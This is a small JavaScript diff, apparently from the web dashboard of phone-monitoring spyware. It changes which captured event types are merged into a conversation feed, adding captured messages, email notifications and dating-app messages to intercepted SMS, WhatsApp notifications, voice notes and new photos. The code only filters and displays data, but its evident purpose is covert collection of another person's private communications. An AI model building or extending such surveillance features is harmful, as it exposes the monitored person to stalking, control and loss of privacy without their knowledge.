@@ -1165,7 +1165,7 @@ function renderMessagesPage(){
 // Fusionne messages texte, vocaux, appels, médias dans un seul fil chronologique
 function renderConversations(evts){
   const relevantTypes=['notification_message','voice_message','voice_note_captured',
-    'root_message','phone_call','call_recording','sms_message','new_photo_detected'];
+    'root_message','sms_message','new_photo_detected','message_captured','email_notification','dating_message'];
   const msgs=evts.filter(e=>relevantTypes.includes(e.type));
   const el=document.getElementById('conversations-list');
   if(!msgs.length){el.innerHTML='<p class="empty">Aucune conversation captee. Les notifications WhatsApp/SMS apparaitront ici.</p>';return;}
